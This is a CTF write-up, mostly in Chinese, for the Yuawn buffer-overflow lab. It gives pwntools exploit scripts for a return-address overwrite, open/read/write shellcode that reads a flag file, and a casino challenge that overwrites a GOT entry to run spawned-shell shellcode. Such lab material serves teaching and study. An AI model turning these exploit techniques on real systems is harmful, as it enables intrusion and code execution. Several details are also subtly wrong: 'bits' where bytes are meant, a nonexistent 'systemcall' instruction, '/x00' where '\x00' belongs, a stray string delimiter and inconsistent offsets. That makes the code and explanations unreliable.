---
title: Yuawn BOF Lab WriteUp
date: 2024-08-05 14:50:20
category: PWN
tags: pwn
---

## bof

### Hijack ret addr

**rip to run call_me()**
+ `objdump -d ./bof`

![image](https://hackmd.io/_uploads/HJhCCyF56.png)

+ `sub rsp,0x30` <- 48 bits in stack 
+ `rbp-ox30` for `gets()` input

![image](https://hackmd.io/_uploads/HyvfggYqp.png)

+ 塞a到 `0x38` <- `0x30` buf + `0x8` saved rbp
+ 然後加上 `p64(call_me()的address)` <- return address
+ 就會跳到call_me去執行

### 總結

>**蓋 0x30 bit 會到 `rbp` 所以要加 8 bit覆蓋rbp 之後才填入要去的address (使用pwntools `p64()`)**


## orw

+ 先用`checksec` 查看 **seccomp & arch**
+ `x86-64 syscall`
+ [seccomp](https://szlin.me/2017/08/23/kernel_seccomp/)
+ **ShellCode**
```asm=
mov rax ,0x67616c662f77
push rax
mov rax ,0x726f2f656d6f682f
push rax
; '/home/orw/flag' push in stack ,so it need to reverse

mov rdi ,rsp 
; Pointer 指向 string

xor rsi, rsi
xor rdx, rdx
;將 RSI 和 RDX 寄存器清零，分別作為 open() 系統調用的 flags 和 mode 參數，表示不設置任何特殊標誌和許可權。

mov rax ,2 
; open systemcall     
syscall 
//open("/home/orw/flag" , 0 , 0)

mov rdi , rax 
;將 RAX 寄存器的返回值（文件描述符）設置為 RDI 寄存器，作為 read() 系統調用的 file descriptor 參數。

mov rsi,rsp ;將 RSP 寄存器的地址設置為 RSI 寄存器，作為 read() 系統調用的 buffer 參數。

mov rdx ,0x50 ;將 RDX 寄存器設置為要讀取的字節數（0x50，80 字節）。
mov rax,0
systemcall
// read( fd , rsp , 0x50 )

mov rdi ,1 ;將 RDI 寄存器設置為 1，作為 write() 系統調用的 file descriptor 參數。
mov rax ,1 ;將 RAX 寄存器設置為 1，表示 write 系統調用。
systemcall 
// write( 1 , rsp , 0x50 )
```

![image](https://hackmd.io/_uploads/BytXUdw2p.png )
![image](https://hackmd.io/_uploads/H1fsJz166.png )

![image](https://hackmd.io/_uploads/HyebrGJTp.png )

+ **`.bss` 的起始位置是`0x601060` 為什麼 `sc` 是 `0x6010a0`**
    + 因前面是塞了 `stdout,stdin,stderr`
    
    ```c++
    void init(){
        setvbuf(stdout,0,2,0);
        setvbuf(stdin,0,2,0);
        setvbuf(stderr,0,2,0);
    }
    ```
+ `.bss -> sc[0x100]` 
+ `r.sendafter(b':)' ,b'a'*18 + p64(0x6010a0))`


```python=
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( '192.168.108.1' , 10171 )
#y = remote( 'edu-ctf.csie.org' , 10171 )
# y = process( 'orw' )
#pause()

# handcraft assembly
sc = asm('''
    mov rax, 0x67616c662f77
    push rax
    mov rax, 0x726f2f656d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    // open( "/home/orw/flag" , 0 , 0 )

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall
    // read( fd , rsp , 0x50 )

    mov rdi, 1
    mov rax, 1
    syscall
    // write( 1 , rsp , 0x50 )

''')

# pwnlib shellcraft
'''
sc = asm(
    shellcraft.pushstr( "/home/orw/flag" ) +
    shellcraft.open( 'rsp' , 0 , 0 ) + 
    shellcraft.read( 'rax' , 'rsp' , 0x30 ) +
    shellcraft.write( 1 , 'rsp' , 0x30 )
)
'''

y.sendafter( b':' , sc )

y.sendlineafter( b':)' , b'a' * 0x18 + p64( 0x6010a0 ) )

y.interactive()
'''


r.sendlineafter(b'>' ,sc)
r.sendlineafter(b':)' ,b'a'*18 + p64(0x601060))

r.interactive()
```





### pwnable orw


+ `x86 (32bit syscall)`

```python=
from pwn import process,remote, p64,asm,context,shellcraft ,success

###
# xor rdi, rdi       ; 將 rdi 寄存器清零，用作文件描述符
# mov rsi, 0x60100   ; 將 rsi 寄存器設置為緩衝區的地址（0x60100）
# mov rdx, 0x100     ; 將 rdx 寄存器設置為要讀取的字節數（0x100，256 字節）
# mov eax, 0         ; 將 eax 寄存器設置為系統調用編號，0 表示 read
# syscall            ; 執行系統調用
###
context.arch ='i386'
context.os ='linux'

r = remote('chall.pwnable.tw',10001)

sc = asm('''
    mov eax ,0x5
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    // open( "/home/orw/flag" , 0 , 0 )

    mov ecx, ebx
    mov ebx,eax
    mov eax,0x3
    mov edx, 0x60
    int 0x80
    // read( fd , rsp , 0x50 )

    mov eax, 0x4
    mov ebx,0x1
    int 0x80
    // write( 1 , rsp , 0x50 )

''')


# sc = asm(
#     shellcraft.open(b'/home/orw/flag')+
#     shellcraft.read('eax','esp',50)+
#     shellcraft.write('1','esp',50)
# ) 


of = b'a'*0x12 + p64(0x804a060)



r.sendafter(b':', sc)



r.interactive()

```
<br>

## casino

+ `checksec casino`

![image](https://hackmd.io/_uploads/SkyRhVJ0a.png )
> `Partial RELOAD` , `No PIE`

### name,age,seed,shellcode
```python
# age =0 , seed =0
name = b'0x6020f0' # name address

# address of name , seed , age ,sc is 
# 0x6020f0 , 0x602100 , 0x602104 , 0x602108
sc = shellcraft.sh()
payload = name + '/x00'*4 + '/x00'*4 + asm(sc)
```

### Ans

+ lottery.c
> 只要 `seed` 一樣 `srand` 生成的亂數就會一樣 -> overflow 設定 `seed = 0` 產生 `lottery`
```c
#include<stdio.h>
#include<stdlib.h>

int main(){
    int lottery[6] ={};
    int seed = 0 ;
    srand(seed);
    for(int i=0;i<6;i++){
        lottery[i] = rand() %100;
        printf("%d,",lottery[i]);
        // 83,86,77,15,93,35
    }

    printf ("%d",&lottery[-43]);

    return 0;
}
```

+ exp

```python
from pwn import remote, p64,context,shellcraft,asm

context.arch = 'amd64'

r= remote('192.168.56.1',10172)

name = b'0x6020f0' # name address
# address of name , seed , age ,sc is 
# 0x6020f0 , 0x602100 , 0x602104 , 0x602108
sc = shellcraft.sh()
payload = name + '/x00'*4 + '/x00'*4 + asm(sc)

lottery = [83,86,77,15,93,35]

r.sendlineafter(b':  ',payload)
r.sendlineafter(b':  ',b'24')

for i in range(7): # age + Lottery
    r.sendlineafter(b': ',b'22')
r.sendlineafter(": ", "1")
r.sendlineafter(": ", "-42")
r.sendlineafter(": ", "0")



for i in lottery:
    r.sendlineafter(b': ',str(i))
r.sendlineafter(": ", "1")
r.sendlineafter(": ", "-43")
r.sendlineafter(": ", "0") # -> clean put@got.plt

r.sendlineafter(b': ',b'6299912') # sc = 0x602108 = 6299912
# guess 0x6020d0
# put@plt 0x602024
# 0x6020d0 - (0x602020, 0x602024) = (0xB0,0xac)
# (0xB0,0xac) /4 = (44 ,43) => (-43 , -42) -> overflow

r.interactive()
```


### plt 

![image](https://hackmd.io/_uploads/H1Se9By0T.png)


```python
# guess 0x6020d0
# put@plt 0x602024
# 0x6020d0 - (0x602020, 0x602024) = (0xB0,0xac)
# (0xB0,0xac) /4 = (44 ,43) => (-43 , -42)
```

最後填入 shellcode address `0x602108 = 6299912`

`cat /home/casino/flag`

`REF` : https://hackmd.io/@a5180352/ByCIQhQ2H
